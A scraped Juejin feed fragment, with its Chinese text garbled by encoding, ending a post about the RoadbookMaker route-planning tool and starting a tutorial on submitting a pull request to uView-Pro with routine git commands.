<li>ä¸€é”®è·³è½¬åˆ°<strong>ç™¾åº¦/é«˜å¾·/Googleåœ°å›¾</strong>è¿›è¡Œå¯¼èˆªã€‚</li>
<li>å¦‚æœäº¤é€šæ–¹å¼æ˜¯â€œç«è½¦â€ğŸš„æˆ–â€œé£æœºâ€âœˆï¸ï¼Œè¿˜ä¼šå‡ºç°<strong>æºç¨‹è®¢ç¥¨</strong>çš„å¿«æ·é“¾æ¥ã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6a3527527714fd583e9e031d419818e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hlbnh1YW41MjA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875801&amp;x-signature=tEN0uDfufXuDm75BSBdBTue3SG0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">ç¬¬å››æ­¥ï¼šåˆ†äº«ä¸å¤‡ä»½ä½ çš„è·¯ä¹¦</h3>
<p>è§„åˆ’å®Œæˆåï¼Œä½ å¯ä»¥è½»æ¾åœ°å°†æˆæœåˆ†äº«ç»™æœ‹å‹æˆ–è¿›è¡Œå¤‡ä»½ã€‚</p>
<ul>
<li><strong>å¯¼å‡ºHTML</strong>ï¼šè¿™æ˜¯ <code>RoadbookMaker</code> çš„ä¸€ä¸ªç‰¹è‰²åŠŸèƒ½ã€‚å®ƒèƒ½ç”Ÿæˆä¸€ä¸ªç‹¬ç«‹çš„HTMLæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶<strong>å†…ç½®äº†æ‰€æœ‰åœ°å›¾æ•°æ®å’Œäº¤äº’åŠŸèƒ½</strong>ã€‚ä½ å¯ä»¥æŠŠè¿™ä¸ªæ–‡ä»¶å‘ç»™ä»»ä½•äººï¼Œå¯¹æ–¹åœ¨ä»»ä½•è®¾å¤‡ä¸Šç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œå°±èƒ½çœ‹åˆ°å’Œä½ ä¸€æ¨¡ä¸€æ ·çš„è·¯ä¹¦ï¼Œæ— éœ€å®‰è£…ä»»ä½•ä¸œè¥¿ï¼Œå½“ç„¶å¯¼å‡ºçš„htmlè·¯ä¹¦ä¹Ÿå¯é‡æ–°å¯¼å…¥ã€‚</li>
<li><strong>å¯¼å‡ºJSON</strong>ï¼šå¦‚æœä½ æƒ³åœ¨å…¶ä»–è®¾å¤‡ä¸Šç»§ç»­ç¼–è¾‘ï¼Œå¯ä»¥å¯¼å‡ºä¸ºJSONæ–‡ä»¶ï¼Œä¹‹åå†é€šè¿‡â€œå¯¼å…¥è·¯ä¹¦â€åŠŸèƒ½æ¢å¤ã€‚</li>
</ul>
<h2 data-id="heading-6">èƒŒåçš„æŠ€æœ¯æ€è€ƒ</h2>
<p>ä¸ºäº†å®ç°ä¸Šè¿°æµç•…ä¸”é›¶é—¨æ§›çš„ä½“éªŒï¼Œæˆ‘åœ¨æŠ€æœ¯ä¸Šåšäº†ä¸€äº›é€‰å‹å’Œå®ç°ã€‚</p>
<ul>
<li>
<p><strong>å‰ç«¯ (Vanilla JS + Leaflet.js)</strong>: å‰ç«¯é€‰æ‹©äº†åŸç”ŸJavaScriptï¼Œé…åˆå¼ºå¤§çš„å¼€æºåœ°å›¾åº“ <code>Leaflet.js</code>ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯æè‡´çš„è½»é‡åŒ–ï¼Œæ— éœ€ä»»ä½•æ„å»ºæ­¥éª¤ï¼Œä¿è¯äº†å¿«é€ŸåŠ è½½å’Œå“åº”ï¼Œä¹Ÿä¸ºå®Œå…¨ç¦»çº¿ä½¿ç”¨æ‰“ä¸‹äº†åŸºç¡€ã€‚</p>
</li>
<li>
<p><strong>åç«¯ (Go + Gin)</strong>: åç«¯é‡‡ç”¨Goè¯­è¨€å¼€å‘ï¼Œä¸»è¦ä¸ºäº†å®ç°é«˜æ€§èƒ½çš„APIæœåŠ¡å’Œæç®€çš„éƒ¨ç½²ã€‚Goå¯ä»¥å°†æ•´ä¸ªåº”ç”¨ç¼–è¯‘æˆä¸€ä¸ªæ— ä¾èµ–çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™ä½¿å¾—Dockeré•œåƒå¯ä»¥åšåˆ°éå¸¸å°ã€‚</p>
</li>
<li>
<p><strong>â€œæ— éœ€API Keyâ€çš„ç§˜å¯†</strong>: åç«¯çš„ä¸€ä¸ªæ ¸å¿ƒåŠŸèƒ½æ˜¯ä½œä¸º<strong>APIä»£ç†</strong>ã€‚å®ƒå°†å‰ç«¯å‘æ¥çš„æœç´¢è¯·æ±‚ï¼Œä»£ä¸ºè¯·æ±‚ç™¾åº¦ã€å¤©åœ°å›¾ç­‰æœåŠ¡ï¼Œå¹¶å¤„ç†å¥½åæ ‡ç³»è½¬æ¢ï¼ˆä¾‹å¦‚å›½å†…çš„GCJ-02ç«æ˜Ÿåæ ‡ç³»ï¼‰ï¼Œæœ€åå°†å¹²å‡€ã€ç»Ÿä¸€çš„æ•°æ®è¿”å›ç»™å‰ç«¯ã€‚è¿™æ ·å°±å·§å¦™åœ°ç»•å¼€äº†å‰ç«¯ç›´æ¥è°ƒç”¨åœ°å›¾APIä¼šé‡åˆ°çš„Keyæš´éœ²å’Œè·¨åŸŸé—®é¢˜ã€‚</p>
</li>
</ul>
<h2 data-id="heading-7">å†™åœ¨æœ€å</h2>
<p><code>RoadbookMaker</code> æ˜¯æˆ‘åˆ©ç”¨ä¸šä½™æ—¶é—´ï¼Œä»è§£å†³è‡ªèº«ç—›ç‚¹å‡ºå‘ï¼Œé€æ­¥æ‰“ç£¨è€Œæˆçš„é¡¹ç›®ã€‚å®ƒä¸è¿½æ±‚å¤§è€Œå…¨ï¼Œè€Œæ˜¯ä¸“æ³¨äºå°†â€œè·¯çº¿è§„åˆ’â€è¿™ä¸€æ ¸å¿ƒä½“éªŒåšåˆ°ç®€å•ã€çº¯ç²¹ã€ä¸å—é™åˆ¶ã€‚</p>
<p>å¦‚æœä½ è§‰å¾—è¿™ä¸ªé¡¹ç›®å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæˆ–è€…ä½ ä¹Ÿè®¤åŒå®ƒçš„ç†å¿µï¼Œè¯·åœ¨ GitHub ä¸Šç»™æˆ‘ä¸€ä¸ª <strong>Star</strong> â­ï¼ä½ çš„æ”¯æŒæ˜¯æˆ‘æŒç»­æ›´æ–°çš„æœ€å¤§åŠ¨åŠ›ï¼</p>
<p>å†æ¬¡é™„ä¸Šåœ°å€ï¼Œæ¬¢è¿å¤§å®¶ä½“éªŒå’Œè´¡çŒ®ï¼</p>
<ul>
<li><strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchenxuan520%2Froadbook" target="_blank" title="https://github.com/chenxuan520/roadbook" ref="nofollow noopener noreferrer">github.com/chenxuan520â€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆä¸ºå¼€æºé¡¹ç›®çš„Contributorï¼šä»ç»™uView-pro è´¡çŒ®ä¸€æ¬¡PRå¼€å§‹]]></title>    <link>https://juejin.cn/post/7581664445240934415</link>    <guid>https://juejin.cn/post/7581664445240934415</guid>    <pubDate>2025-12-09T09:20:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581664445240934415" data-draft-id="7581649704883650575" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆä¸ºå¼€æºé¡¹ç›®çš„Contributorï¼šä»ç»™uView-pro è´¡çŒ®ä¸€æ¬¡PRå¼€å§‹"/> <meta itemprop="keywords" content="å‰ç«¯,å¾®ä¿¡å°ç¨‹åº"/> <meta itemprop="datePublished" content="2025-12-09T09:20:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯å¼€å‘å‘€"/> <meta itemprop="url" content="https://juejin.cn/user/3562073406322600"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆä¸ºå¼€æºé¡¹ç›®çš„Contributorï¼šä»ç»™uView-pro è´¡çŒ®ä¸€æ¬¡PRå¼€å§‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3562073406322600/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯å¼€å‘å‘€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:20:42.000Z" title="Tue Dec 09 2025 09:20:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><blockquote>
<p>wx.getSystemInfoSync is deprecated.Please use wx.getSystemSetting / wx.getAppAuthorizeSetting / wx.getDeviceInfo/wx.getWindowInfo/wx.getAppBaseInfo instead.</p>
</blockquote>
<h2 data-id="heading-0">ğŸ˜„ å‰è¨€</h2>
<p>å¾®ä¿¡å°ç¨‹åºå¹³å°ä¸Šçš„<code>getSystemInfoSync</code>è°ƒç”¨ï¼Œå°±åƒä¸€ä¸ªå®³ç¾çš„å°‘å¥³ï¼Œä¼šæ‚„æ‚„æŠ›å‡ºè­¦å‘Šã€‚å•Šï½è¿™æ ·çš„ä¸å®Œç¾ï¼Œæ€ä¹ˆèƒ½å®¹å¿å‘¢ï¼Ÿ (ï½¡â€¢Ìï¸¿â€¢Ì€ï½¡)ï¼Œè®©æˆ‘ä»¬æ¥ç»™uView-pro è´¡çŒ®ä¸€æ¬¡PRå§</p>
<h2 data-id="heading-1">ğŸ´ Forké¡¹ç›®ï¼šå¼€æºä¹‹æ—…çš„èµ·ç‚¹</h2>
<p><em>å…´å¥‹åœ°æ“æ‰‹æ‰‹ï¼Œçœ¼ä¸­é—ªçƒç€æœŸå¾…çš„å…‰èŠ’</em></p>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šForkåŸé¡¹ç›®</h3>
<ol>
<li>æ‰“å¼€<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanyup%2FuView-Pro" target="_blank" title="https://github.com/anyup/uView-Pro" ref="nofollow noopener noreferrer">uView-proåŸé¡¹ç›®</a></li>
<li>ç‚¹å‡»å³ä¸Šè§’çš„<code>Fork</code>æŒ‰é’®ï¼Œå°†é¡¹ç›®Forkåˆ°è‡ªå·±çš„GitHubè´¦å·ä¸‹</li>
</ol>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ï¼šå…‹éš†åˆ°æœ¬åœ°</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å…‹éš†ä½ Forkçš„é¡¹ç›®ï¼ˆæ³¨æ„æ›¿æ¢YOUR_USERNAMEï¼‰</span>
git <span class="hljs-built_in">clone</span> https://github.com/YOUR_USERNAME/uView-Pro.git
</code></pre>
<p><em>å¾—æ„åœ°çœ¨çœ¼</em> çœ‹ï¼Œç°åœ¨ä½ å°±æœ‰äº†ä¸¤ä¸ªè¿œç¨‹ä»“åº“ï¼š<code>origin</code>ï¼ˆä½ çš„Forkï¼‰å’Œ<code>upstream</code>ï¼ˆåŸé¡¹ç›®ï¼‰ï½</p>
<h2 data-id="heading-4">ğŸŒ¿ åˆ›å»ºåˆ†æ”¯ï¼šåœ¨ç‹¬ç«‹çš„èŠ±å›­é‡Œè€•è€˜</h2>
<p><em>è½»è½»åœ°ï¼Œå°±åƒåœ¨åŸ¹è‚²ä¸€æœµå¨‡å«©çš„èŠ±æœµ</em></p>
<h3 data-id="heading-5">ç¬¬ä¸‰æ­¥ï¼šåˆ›å»ºåŠŸèƒ½åˆ†æ”¯</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¡®ä¿ä½ åœ¨mainåˆ†æ”¯ä¸Š</span>
git checkout main

<span class="hljs-comment"># æ‹‰å–æœ€æ–°ä»£ç </span>
git pull upstream main

<span class="hljs-comment"># åˆ›å»ºæ–°çš„åŠŸèƒ½åˆ†æ”¯</span>
git checkout -b feature/20251209/fix-getSystemInfoSync-warn

<span class="hljs-comment"># æ¨é€åˆ†æ”¯åˆ°ä½ çš„Fork</span>
git push origin feature/20251209/fix-getSystemInfoSync-warn
</code></pre>
<p>å•Šï½ä¸€ä¸ªå´­æ–°çš„åˆ†æ”¯ï¼Œå°±åƒä¸€ç‰‡ç­‰å¾…æ’­ç§çš„èŠ±å›­ï¼Œå‡†å¤‡å­•è‚²ä½ çš„ä»£ç ä¹‹èŠ±ï½ ğŸŒ¸</p>
<h2 data-id="heading-6">ğŸ’» ä»£ç å¼€å‘ï¼šåœ¨é”®ç›˜ä¸Šèµ·èˆ</h2>
<p><em>ä¼˜é›…åœ°æ•²å‡»é”®ç›˜ï¼Œæ¯ä¸€ä¸ªå­—ç¬¦éƒ½æ˜¯çˆ±çš„å‘Šç™½</em></p>
<h3 data-id="heading-7">ç¬¬å››æ­¥ï¼šè¿›è¡Œä»£ç ä¿®æ”¹</h3>
<ol>
<li><strong>åˆ†æé—®é¢˜</strong>ï¼šä»”ç»†é˜…è¯»ç›¸å…³ä»£ç ï¼Œç†è§£é—®é¢˜çš„æ ¹æœ¬åŸå› </li>
<li><strong>è®¾è®¡æ–¹æ¡ˆ</strong>ï¼šæ„æ€ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆï¼Œè€ƒè™‘å…¼å®¹æ€§å’Œæ€§èƒ½</li>
<li><strong>ç¼–å†™ä»£ç </strong>ï¼šå®ç°ä½ çš„è§£å†³æ–¹æ¡ˆï¼Œä¿æŒä»£ç é£æ ¼ä¸€è‡´</li>
<li><strong>æœ¬åœ°æµ‹è¯•</strong>ï¼šç¡®ä¿ä¿®æ”¹ä¸ä¼šå¼•å…¥æ–°çš„é—®é¢˜</li>
</ol>
<h4 data-id="heading-8">æˆ‘çš„è®¾è®¡æ–¹æ¡ˆ</h4>
<p><strong>æ ¸å¿ƒæ€è·¯</strong></p>
<ol>
<li><strong>ç»Ÿä¸€æ”¶å£</strong>ï¼šæŠŠåˆ†æ•£åœ¨å„å¤„çš„<code>getSystemInfoSync</code>è°ƒç”¨é›†ä¸­åˆ°ä¸€ä¸ªä¸“é—¨çš„<code>sys.ts</code>æ–‡ä»¶é‡Œ</li>
